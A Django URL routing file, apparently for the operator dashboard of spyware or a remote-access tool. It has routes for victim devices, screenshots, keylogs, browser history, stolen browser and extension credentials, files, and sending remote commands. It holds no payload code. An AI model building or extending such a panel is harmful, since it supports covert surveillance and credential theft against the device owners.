from django.urls import path
from . import dashboard_views
from extension_data.dashboard_views import ExtensionCredentialListView

urlpatterns = [
    path('', dashboard_views.dashboard, name='dashboard'),
    path('devices/', dashboard_views.devices, name='devices'),
    path('device/<str:device_id>/', dashboard_views.device_detail, name='device_detail'),
    path('device/<str:device_id>/settings/', dashboard_views.device_settings, name='device_settings'),
    path('device/<str:device_id>/delete/', dashboard_views.device_delete, name='device_delete'),
    path('screenshots/', dashboard_views.screenshots, name='screenshots'),
    path('keylogs/', dashboard_views.keylogs, name='keylogs'),
    path('browser/history/', dashboard_views.browser_history, name='browser_history'),
    path('browser/credentials/', dashboard_views.browser_credentials, name='browser_credentials'),
    path('extension/data/', ExtensionCredentialListView.as_view(), name='extension_data_list'),
    path('files/', dashboard_views.files, name='files'),
    path('commands/', dashboard_views.commands, name='commands'),
    path('settings/', dashboard_views.settings_view, name='settings'),
    
    # API-style endpoints for AJAX
    path('api/commands/send/', dashboard_views.send_command, name='send_command'),
]
